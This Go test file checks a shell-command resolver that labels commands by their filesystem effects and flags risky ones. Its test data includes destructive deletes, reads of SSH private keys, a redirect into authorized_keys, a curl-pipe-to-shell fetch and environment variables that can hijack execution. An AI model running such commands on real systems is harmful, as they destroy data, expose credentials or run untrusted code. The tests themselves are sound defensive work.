package resolver

import (
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"

	"github.com/Vadym903/Intenter/internal/action"
	"github.com/Vadym903/Intenter/internal/parser"
	"github.com/Vadym903/Intenter/internal/parser/posix"
)

// fsRegistry is the recognizer set under test.
func fsRegistry() *Registry {
	registry := NewRegistry()
	registry.Register(FilesystemRecognizers()...)
	return registry
}

// recognize parses a one-command line in the repository root and resolves it.
func (r *repo) recognize(t *testing.T, command string) action.ResolvedCommand {
	t.Helper()
	return r.recognizeIn(t, r.root, command)
}

func (r *repo) recognizeIn(t *testing.T, cwd, command string) action.ResolvedCommand {
	t.Helper()

	parsed, err := posix.New().Parse(parser.Input{
		Command: command, Cwd: cwd, Home: r.home, TempDir: os.TempDir(),
	})
	if err != nil {
		t.Fatalf("parse %q: %v", command, err)
	}
	if len(parsed.Commands) != 1 {
		t.Fatalf("parse %q produced %d commands, want 1 (%v)", command, len(parsed.Commands), parsed.UnsupportedSummary())
	}

	ctx := r.builder.Build(cwd, "")
	return fsRegistry().Recognize(Request{
		Command: parsed.Commands[0],
		Context: ctx,
		Dialect: action.DialectPosix,
	})
}

// effectSummary renders effects as "DELETE(recursive,force) ./dist" so table
// expectations read like the explanations the CLI prints.
func effectSummary(out action.ResolvedCommand) []string {
	summary := make([]string, 0, len(out.Effects))
	for _, effect := range out.Effects {
		text := string(effect.Type)
		if len(effect.Flags) > 0 {
			flags := make([]string, 0, len(effect.Flags))
			for _, flag := range effect.Flags {
				flags = append(flags, string(flag))
			}
			sort.Strings(flags)
			text += "(" + strings.Join(flags, ",") + ")"
		}
		switch {
		case effect.Target != nil:
			text += " " + effect.Target.Display
		case effect.Program != nil:
			text += " program:" + string(effect.Program.Resolution)
		case effect.Network != nil:
			text += " " + effect.Network.String()
		}
		summary = append(summary, text)
	}
	sort.Strings(summary)
	return summary
}

func assertEffects(t *testing.T, out action.ResolvedCommand, want ...string) {
	t.Helper()
	got := effectSummary(out)
	sort.Strings(want)
	if strings.Join(got, " | ") != strings.Join(want, " | ") {
		t.Errorf("effects = %v, want %v", got, want)
	}
}

func TestRemoveRecognizer(t *testing.T) {
	r := newRepo(t)
	r.write(t, "package.json", `{"name":"demo"}`)
	if err := os.MkdirAll(filepath.Join(r.root, "dist"), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}

	tests := []struct {
		name    string
		command string
		op      action.SemanticOp
		status  action.ResolutionStatus
		effects []string
	}{
		{
			name: "recursive force", command: "rm -rf ./dist",
			op: action.OpFSDelete, status: action.StatusResolved,
			effects: []string{"DELETE(force,recursive) ./dist"},
		},
		{
			name: "clustered flags read as separate options", command: "rm -r -f ./dist",
			op: action.OpFSDelete, status: action.StatusResolved,
			effects: []string{"DELETE(force,recursive) ./dist"},
		},
		{
			name: "long options", command: "rm --recursive --force ./dist",
			op: action.OpFSDelete, status: action.StatusResolved,
			effects: []string{"DELETE(force,recursive) ./dist"},
		},
		{
			name: "plain delete", command: "rm ./notes.txt",
			op: action.OpFSDelete, status: action.StatusResolved,
			effects: []string{"DELETE ./notes.txt"},
		},
		{
			name: "several targets", command: "rm -f ./a.txt ./b.txt",
			op: action.OpFSDelete, status: action.StatusResolved,
			effects: []string{"DELETE(force) ./a.txt", "DELETE(force) ./b.txt"},
		},
		{
			name: "safe options are ignored", command: "rm -rfv --interactive ./dist",
			op: action.OpFSDelete, status: action.StatusResolved,
			effects: []string{"DELETE(force,recursive) ./dist"},
		},
		{
			name: "unknown option is refused", command: "rm --zap ./dist",
			op: action.OpFSDelete, status: action.StatusUnresolved,
			effects: []string{"EXECUTE program:UNRESOLVED"},
		},
		{
			name: "unknown clustered letter is refused", command: "rm -rz ./dist",
			op: action.OpFSDelete, status: action.StatusUnresolved,
			effects: []string{"EXECUTE program:UNRESOLVED"},
		},
		{
			name: "no target is refused", command: "rm -rf",
			op: action.OpFSDelete, status: action.StatusUnresolved,
			effects: []string{"EXECUTE program:UNRESOLVED"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			out := r.recognize(t, tt.command)
			if out.SemanticOp != tt.op {
				t.Errorf("semantic op = %s, want %s", out.SemanticOp, tt.op)
			}
			if out.Status != tt.status {
				t.Errorf("status = %s (%s), want %s", out.Status, out.StatusReason, tt.status)
			}
			assertEffects(t, out, tt.effects...)
		})
	}
}

func TestRemoveOutsideTheWorkspaceKeepsItsScope(t *testing.T) {
	r := newRepo(t)

	out := r.recognize(t, "rm -rf ~/Documents")
	if out.Status != action.StatusResolved {
		t.Fatalf("status = %s (%s)", out.Status, out.StatusReason)
	}
	if len(out.Targets) != 1 {
		t.Fatalf("targets = %+v, want one", out.Targets)
	}
	target := out.Targets[0]
	if target.Scope != action.ScopeHome {
		t.Errorf("scope = %s, want HOME", target.Scope)
	}
	if target.Display != "~/Documents" {
		t.Errorf("display = %q, want ~/Documents", target.Display)
	}
	if !target.HasFlag(action.FlagBroad) {
		t.Error("a standard HOME sub-directory is broad (§16.5)")
	}
}

func TestRemoveWildcardCarriesTheWildcardFlag(t *testing.T) {
	r := newRepo(t)
	if err := os.MkdirAll(filepath.Join(r.root, "build"), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}

	out := r.recognize(t, "rm -rf build/*")
	if len(out.Effects) == 0 {
		t.Fatal("want a delete effect")
	}
	if !out.Effects[0].HasFlag(action.EffectFlagWildcard) {
		t.Errorf("effect flags = %v, want wildcard", out.Effects[0].Flags)
	}
	if !out.Targets[0].HasFlag(action.FlagWildcard) {
		t.Errorf("target flags = %v, want wildcard", out.Targets[0].Flags)
	}
}

func TestCopyRecognizer(t *testing.T) {
	r := newRepo(t)

	tests := []struct {
		name    string
		command string
		status  action.ResolutionStatus
		effects []string
	}{
		{
			name: "single file", command: "cp ./a.txt ./b.txt",
			status:  action.StatusResolved,
			effects: []string{"READ ./a.txt", "CREATE ./b.txt", "WRITE ./b.txt"},
		},
		{
			name: "recursive", command: "cp -r ./src ./backup",
			status: action.StatusResolved,
			effects: []string{
				"READ(recursive) ./src",
				"CREATE(recursive) ./backup",
				"WRITE(recursive) ./backup",
			},
		},
		{
			name: "several sources", command: "cp ./a.txt ./b.txt ./out",
			status:  action.StatusResolved,
			effects: []string{"READ ./a.txt", "READ ./b.txt", "CREATE ./out", "WRITE ./out"},
		},
		{
			name: "target directory option", command: "cp -t ./out ./a.txt ./b.txt",
			status:  action.StatusResolved,
			effects: []string{"READ ./a.txt", "READ ./b.txt", "CREATE ./out", "WRITE ./out"},
		},
		{
			name: "inline optional value stays safe", command: "cp --preserve=mode ./a.txt ./b.txt",
			status:  action.StatusResolved,
			effects: []string{"READ ./a.txt", "CREATE ./b.txt", "WRITE ./b.txt"},
		},
		{
			name: "one operand is refused", command: "cp ./a.txt",
			status:  action.StatusUnresolved,
			effects: []string{"EXECUTE program:UNRESOLVED"},
		},
		{
			name: "unknown option is refused", command: "cp --zap ./a.txt ./b.txt",
			status:  action.StatusUnresolved,
			effects: []string{"EXECUTE program:UNRESOLVED"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			out := r.recognize(t, tt.command)
			if out.Status != tt.status {
				t.Errorf("status = %s (%s), want %s", out.Status, out.StatusReason, tt.status)
			}
			assertEffects(t, out, tt.effects...)
		})
	}
}

func TestMoveDeletesTheSource(t *testing.T) {
	r := newRepo(t)

	out := r.recognize(t, "mv ./a.txt ./b.txt")
	if out.SemanticOp != action.OpFSMove {
		t.Errorf("semantic op = %s, want FS_MOVE", out.SemanticOp)
	}
	assertEffects(t, out, "DELETE ./a.txt", "CREATE ./b.txt")
}

func TestMoveOfADirectoryIsRecursive(t *testing.T) {
	r := newRepo(t)
	if err := os.MkdirAll(filepath.Join(r.root, "src"), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}

	out := r.recognize(t, "mv ./src ./moved")
	assertEffects(t, out, "DELETE(recursive) ./src", "CREATE ./moved")
}

func TestMakeDirRecognizer(t *testing.T) {
	r := newRepo(t)

	out := r.recognize(t, "mkdir -p ./out/reports")
	if out.SemanticOp != action.OpFSCreate {
		t.Errorf("semantic op = %s, want FS_CREATE", out.SemanticOp)
	}
	assertEffects(t, out, "CREATE ./out/reports")

	refused := r.recognize(t, "mkdir --zap ./out")
	if refused.Status != action.StatusUnresolved {
		t.Errorf("status = %s, want UNRESOLVED for an unknown option", refused.Status)
	}
}

func TestCatRecognizer(t *testing.T) {
	r := newRepo(t)

	out := r.recognize(t, "cat ./README.md")
	if out.SemanticOp != action.OpFSRead {
		t.Errorf("semantic op = %s, want FS_READ", out.SemanticOp)
	}
	assertEffects(t, out, "READ ./README.md")

	stdin := r.recognize(t, "cat -")
	assertEffects(t, stdin)

	sensitive := r.recognize(t, "cat ~/.ssh/id_rsa")
	if len(sensitive.Targets) != 1 || !sensitive.Targets[0].HasFlag(action.FlagSensitive) {
		t.Errorf("a credential path must be flagged sensitive, got %+v", sensitive.Targets)
	}
}

func TestGrepRecognizer(t *testing.T) {
	r := newRepo(t)

	tests := []struct {
		name    string
		command string
		status  action.ResolutionStatus
		effects []string
	}{
		{
			name: "pattern then file", command: "grep TODO ./src/main.go",
			status: action.StatusResolved, effects: []string{"READ ./src/main.go"},
		},
		{
			name: "recursive", command: "grep -r TODO ./src",
			status: action.StatusResolved, effects: []string{"READ(recursive) ./src"},
		},
		{
			name: "clustered unknown letter stays safe", command: "grep -rn TODO ./src",
			status: action.StatusResolved, effects: []string{"READ(recursive) ./src"},
		},
		{
			name: "explicit pattern option", command: "grep -e TODO ./a.go ./b.go",
			status: action.StatusResolved, effects: []string{"READ ./a.go", "READ ./b.go"},
		},
		{
			name: "pattern file is read", command: "grep -f ./patterns.txt ./a.go",
			status: action.StatusResolved, effects: []string{"READ ./patterns.txt", "READ ./a.go"},
		},
		{
			name: "context option takes its value", command: "grep -A 3 TODO ./a.go",
			status: action.StatusResolved, effects: []string{"READ ./a.go"},
		},
		{
			name: "clustered context value", command: "grep -A3 TODO ./a.go",
			status: action.StatusResolved, effects: []string{"READ ./a.go"},
		},
		{
			name: "unknown long option stays safe", command: "grep --line-buffered TODO ./a.go",
			status: action.StatusResolved, effects: []string{"READ ./a.go"},
		},
		{
			name: "colour option does not swallow the path", command: "grep --color TODO ./a.go",
			status: action.StatusResolved, effects: []string{"READ ./a.go"},
		},
		{
			name: "inline colour option", command: "grep --color=auto TODO ./a.go",
			status: action.StatusResolved, effects: []string{"READ ./a.go"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			out := r.recognize(t, tt.command)
			if out.Status != tt.status {
				t.Errorf("status = %s (%s), want %s", out.Status, out.StatusReason, tt.status)
			}
			assertEffects(t, out, tt.effects...)
		})
	}
}

func TestGrepOfASensitiveFileIsNotHiddenByOptions(t *testing.T) {
	// A value-taking option that was misclassified would swallow the path and
	// hide the read of a credential file.
	r := newRepo(t)

	for _, command := range []string{
		"grep --color secret ~/.ssh/id_rsa",
		"grep -n secret ~/.ssh/id_rsa",
		"grep -rn secret ~/.ssh",
	} {
		out := r.recognize(t, command)
		if len(out.Targets) == 0 {
			t.Fatalf("%q: the credential path must still be a target", command)
		}
		if !out.Targets[0].HasFlag(action.FlagSensitive) {
			t.Errorf("%q: target %q must be flagged sensitive", command, out.Targets[0].Display)
		}
	}
}

func TestFindRecognizer(t *testing.T) {
	r := newRepo(t)

	tests := []struct {
		name    string
		command string
		op      action.SemanticOp
		status  action.ResolutionStatus
		effects []string
	}{
		{
			name: "read only", command: "find . -name '*.log'",
			op: action.OpFSRead, status: action.StatusResolved,
			effects: []string{"READ ."},
		},
		{
			name: "default start path", command: "find -name '*.log'",
			op: action.OpFSRead, status: action.StatusResolved,
			effects: []string{"READ ."},
		},
		{
			name: "explicit start path", command: "find ./src -type f",
			op: action.OpFSRead, status: action.StatusResolved,
			effects: []string{"READ ./src"},
		},
		{
			name: "delete", command: "find ./build -name '*.tmp' -delete",
			op: action.OpFSDelete, status: action.StatusResolved,
			effects: []string{"READ ./build", "DELETE(recursive,wildcard) ./build"},
		},
		{
			name: "exec is refused", command: "find . -name '*.tmp' -exec rm {} ;",
			op: action.OpFSRead, status: action.StatusUnresolved,
			effects: []string{"READ .", "EXECUTE program:UNRESOLVED"},
		},
		{
			name: "unknown predicate is refused", command: "find . -zap x",
			op: action.OpFSRead, status: action.StatusUnresolved,
			effects: []string{"EXECUTE program:UNRESOLVED"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			out := r.recognize(t, tt.command)
			if out.SemanticOp != tt.op {
				t.Errorf("semantic op = %s, want %s", out.SemanticOp, tt.op)
			}
			if out.Status != tt.status {
				t.Errorf("status = %s (%s), want %s", out.Status, out.StatusReason, tt.status)
			}
			assertEffects(t, out, tt.effects...)
		})
	}
}

func TestFindGroupingTokensAreNotStartPaths(t *testing.T) {
	r := newRepo(t)

	out := r.recognize(t, `find ./src \( -name a -o -name b \)`)
	if out.Status != action.StatusResolved {
		t.Fatalf("status = %s (%s)", out.Status, out.StatusReason)
	}
	assertEffects(t, out, "READ ./src")
}

func TestUnknownExecutableIsUnresolved(t *testing.T) {
	r := newRepo(t)

	out := r.recognize(t, "chmod -R 777 ./src")
	if out.Status != action.StatusUnresolved {
		t.Errorf("status = %s, want UNRESOLVED for an unmodeled program", out.Status)
	}
	if out.SemanticOp != action.OpUnknown {
		t.Errorf("semantic op = %s, want UNKNOWN", out.SemanticOp)
	}
	if !strings.Contains(out.StatusReason, "chmod") {
		t.Errorf("the reason must name the program, got %q", out.StatusReason)
	}
	assertEffects(t, out, "EXECUTE program:UNRESOLVED")
}

func TestRedirectionEffectsApplyToEveryCommand(t *testing.T) {
	r := newRepo(t)

	tests := []struct {
		name    string
		command string
		effects []string
	}{
		{"truncate", "cat ./a.txt > ./out.txt", []string{"READ ./a.txt", "CREATE ./out.txt", "WRITE ./out.txt"}},
		{"append", "cat ./a.txt >> ./log.txt", []string{"READ ./a.txt", "WRITE ./log.txt"}},
		{"stderr", "cat ./a.txt 2> ./err.txt", []string{"READ ./a.txt", "CREATE ./err.txt", "WRITE ./err.txt"}},
		{"read", "grep -f ./p.txt ./a.txt < ./in.txt", []string{"READ ./p.txt", "READ ./a.txt", "READ ./in.txt"}},
		{"dev null is ignored", "cat ./a.txt > /dev/null", []string{"READ ./a.txt"}},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assertEffects(t, r.recognize(t, tt.command), tt.effects...)
		})
	}
}

func TestRedirectionOfAnUnknownProgramIsStillModeled(t *testing.T) {
	// The executable is unresolved, but the shell still writes the file.
	r := newRepo(t)

	out := r.recognize(t, "some-tool > ~/.ssh/authorized_keys")
	if out.Status != action.StatusUnresolved {
		t.Errorf("status = %s, want UNRESOLVED", out.Status)
	}
	assertEffects(t, out,
		"EXECUTE program:UNRESOLVED",
		"CREATE ~/.ssh/authorized_keys",
		"WRITE ~/.ssh/authorized_keys")
	if !out.Targets[0].HasFlag(action.FlagSensitive) {
		t.Error("the redirection target must keep its sensitive flag")
	}
}

func TestDangerousEnvironmentOverrideDegradesTheCommand(t *testing.T) {
	r := newRepo(t)

	out := r.recognize(t, "PATH=/tmp/evil rm -rf ./dist")
	if out.Status != action.StatusUnresolved {
		t.Errorf("status = %s, want UNRESOLVED (§14.2)", out.Status)
	}
	if !strings.Contains(out.StatusReason, "PATH") {
		t.Errorf("the reason must name the override, got %q", out.StatusReason)
	}

	harmless := r.recognize(t, "NODE_ENV=production rm -rf ./dist")
	if harmless.Status != action.StatusResolved {
		t.Errorf("status = %s (%s), want RESOLVED", harmless.Status, harmless.StatusReason)
	}
}

func TestEnvOverrideAllowlistCatchesExecutionVectors(t *testing.T) {
	// The env handling is an allowlist: any variable not proven harmless makes
	// the command UNRESOLVED. PAGER is the one the old denylist missed, which
	// made `PAGER='<cmd>' git --paginate log` an auto-allowed read that ran an
	// arbitrary command through the pager.
	r := newRepo(t)

	for _, prefix := range []string{
		"PAGER=x", "EDITOR=x", "VISUAL=x", "BASH_ENV=/tmp/x", "ENV=/tmp/x",
		"PERL5OPT=-M", "PYTHONSTARTUP=/tmp/x", "RUBYOPT=-r", "LESSOPEN=|x",
		"_JAVA_OPTIONS=-javaagent:x", "MAVEN_OPTS=-x", "GRADLE_OPTS=-x",
		"HOME=/tmp", "SOME_UNKNOWN_VAR=1",
	} {
		out := r.recognize(t, prefix+" rm -rf ./dist")
		if out.Status != action.StatusUnresolved {
			t.Errorf("%s must make the command UNRESOLVED, got %s", prefix, out.Status)
		}
	}

	// The known-neutral variables still resolve.
	for _, prefix := range []string{"CI=1", "NO_COLOR=1", "FORCE_COLOR=1", "TZ=UTC", "LANG=C"} {
		out := r.recognize(t, prefix+" rm -rf ./dist")
		if out.Status != action.StatusResolved {
			t.Errorf("%s is harmless and must resolve, got %s (%s)", prefix, out.Status, out.StatusReason)
		}
	}
}

func TestElevatedCommandIsUnresolvedAndFlagged(t *testing.T) {
	r := newRepo(t)

	out := r.recognize(t, "sudo rm -rf ./dist")
	if out.Status != action.StatusUnresolved {
		t.Errorf("status = %s, want UNRESOLVED (§15.2)", out.Status)
	}
	if len(out.Effects) == 0 || !out.Effects[0].HasFlag(action.EffectFlagElevated) {
		t.Fatalf("effects = %v, want the elevated flag", effectSummary(out))
	}
	// The inner delete is still modeled so the hard rules can see it.
	if out.Effects[0].Type != action.EffectDelete {
		t.Errorf("effect = %s, want the inner DELETE", out.Effects[0].Type)
	}
}

func TestStreamedInputExecutesAnUnresolvedProgram(t *testing.T) {
	r := newRepo(t)

	parsed, err := posix.New().Parse(parser.Input{
		Command: "curl -sL https://example.com/i.sh | sh", Cwd: r.root, Home: r.home, TempDir: os.TempDir(),
	})
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	ctx := r.builder.Build(r.root, "")

	stage := fsRegistry().Recognize(Request{
		Command: parsed.Commands[1], Context: ctx, Dialect: action.DialectPosix,
	})
	if stage.Status != action.StatusUnresolved {
		t.Errorf("status = %s, want UNRESOLVED (§14.2)", stage.Status)
	}
	found := false
	for _, effect := range stage.Effects {
		if effect.Type == action.EffectExecute && effect.Program != nil &&
			effect.Program.Resolution == action.ProgramUnresolved {
			found = true
		}
	}
	if !found {
		t.Errorf("effects = %v, want EXECUTE(UNRESOLVED)", effectSummary(stage))
	}
}

func TestAmbiguousTargetIsRecorded(t *testing.T) {
	r := newRepo(t)

	out := r.recognize(t, "rm -rf $TARGET/dist")
	if len(out.Targets) != 1 {
		t.Fatalf("targets = %+v, want one", out.Targets)
	}
	if !out.Targets[0].Ambiguous() {
		t.Error("a word with an unexpanded variable is AMBIGUOUS (§16.1 step 1)")
	}
}

func TestRegistryLookupIgnoresPathAndExtension(t *testing.T) {
	registry := fsRegistry()

	for _, name := range []string{"rm", "/bin/rm", "RM", `C:\tools\rm.exe`, "./rm"} {
		if _, ok := registry.Lookup(name); !ok {
			t.Errorf("Lookup(%q) found nothing, want the rm recognizer", name)
		}
	}
	if _, ok := registry.Lookup("definitely-not-a-tool"); ok {
		t.Error("an unregistered name must not resolve")
	}
	if _, ok := registry.Lookup(""); ok {
		t.Error("an empty name must not resolve")
	}
}

func TestGrammarScanClassesAndDefaults(t *testing.T) {
	grammar := Grammar{
		Safe:              []string{"-v", "--verbose"},
		SafeValue:         []string{"--label"},
		SafeOptionalValue: []string{"--color"},
		Semantic:          []string{"-r"},
		SemanticValue:     []string{"-t"},
		SafePrefixes:      []string{"--reporter"},
		Cluster:           true,
	}

	tests := []struct {
		name     string
		args     []string
		operands []string
		options  map[string]string
		unknown  []string
	}{
		{"plain operands", []string{"a", "b"}, []string{"a", "b"}, nil, nil},
		{"cluster", []string{"-rv", "a"}, []string{"a"}, map[string]string{"-r": "", "-v": ""}, nil},
		{"value option", []string{"-t", "out", "a"}, []string{"a"}, map[string]string{"-t": "out"}, nil},
		{"clustered value", []string{"-tout", "a"}, []string{"a"}, map[string]string{"-t": "out"}, nil},
		{"inline long value", []string{"--label=x", "a"}, []string{"a"}, map[string]string{"--label": "x"}, nil},
		{"optional value bare", []string{"--color", "a"}, []string{"a"}, map[string]string{"--color": ""}, nil},
		{"optional value inline", []string{"--color=auto", "a"}, []string{"a"}, map[string]string{"--color": "auto"}, nil},
		{"safe prefix", []string{"--reporter-json", "a"}, []string{"a"}, nil, nil},
		{"end of options", []string{"--", "-r"}, []string{"-r"}, nil, nil},
		{"dash is an operand", []string{"-"}, []string{"-"}, nil, nil},
		{"unknown long", []string{"--zap"}, nil, nil, []string{"--zap"}},
		{"unknown short", []string{"-z"}, nil, nil, []string{"-z"}},
		{"boolean with a value is refused", []string{"-r=1"}, nil, nil, []string{"-r=1"}},
		{"missing value is refused", []string{"-t"}, nil, nil, []string{"-t"}},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			words := make([]parser.Word, 0, len(tt.args))
			for _, arg := range tt.args {
				words = append(words, parser.Word{Text: arg})
			}
			got := grammar.Scan(words)

			operands := make([]string, 0, len(got.Operands))
			for _, operand := range got.Operands {
				operands = append(operands, operand.Text)
			}
			if strings.Join(operands, ",") != strings.Join(tt.operands, ",") {
				t.Errorf("operands = %v, want %v", operands, tt.operands)
			}
			for name, want := range tt.options {
				if !got.Has(name) {
					t.Errorf("option %s missing", name)
					continue
				}
				if value := got.Value(name).Text; value != want {
					t.Errorf("option %s = %q, want %q", name, value, want)
				}
			}
			if strings.Join(got.Unknown, ",") != strings.Join(tt.unknown, ",") {
				t.Errorf("unknown = %v, want %v", got.Unknown, tt.unknown)
			}
			if got.OK() != (len(tt.unknown) == 0) {
				t.Errorf("OK() = %v with unknown %v", got.OK(), got.Unknown)
			}
		})
	}
}

func TestGrammarClassifyDefaultsToUnknown(t *testing.T) {
	grammar := Grammar{Safe: []string{"-v"}, Semantic: []string{"-r"}}

	if got := grammar.Classify("-v"); got != ArgSafe {
		t.Errorf("Classify(-v) = %s, want SAFE", got)
	}
	if got := grammar.Classify("-r"); got != ArgSemantic {
		t.Errorf("Classify(-r) = %s, want SEMANTIC", got)
	}
	if got := grammar.Classify("--anything"); got != ArgUnknown {
		t.Errorf("Classify(--anything) = %s, want UNKNOWN (§15.3)", got)
	}

	permissive := Grammar{PermissiveUnknown: true}
	if got := permissive.Classify("--anything"); got != ArgSafe {
		t.Errorf("a permissive grammar accepts unlisted options, got %s", got)
	}
}

func TestLeadingOperandsStopAtTheFirstOption(t *testing.T) {
	grammar := Grammar{Safe: []string{"-print"}, SafeValue: []string{"-name"}}

	words := []parser.Word{{Text: "a"}, {Text: "b"}, {Text: "-name"}, {Text: "x"}, {Text: "c"}}
	got := grammar.Scan(words)

	leading := make([]string, 0, 2)
	for _, operand := range got.LeadingOperands() {
		leading = append(leading, operand.Text)
	}
	if strings.Join(leading, ",") != "a,b" {
		t.Errorf("leading operands = %v, want [a b]", leading)
	}
	if len(got.Operands) != 3 {
		t.Errorf("operands = %+v, want three including the trailing one", got.Operands)
	}
}
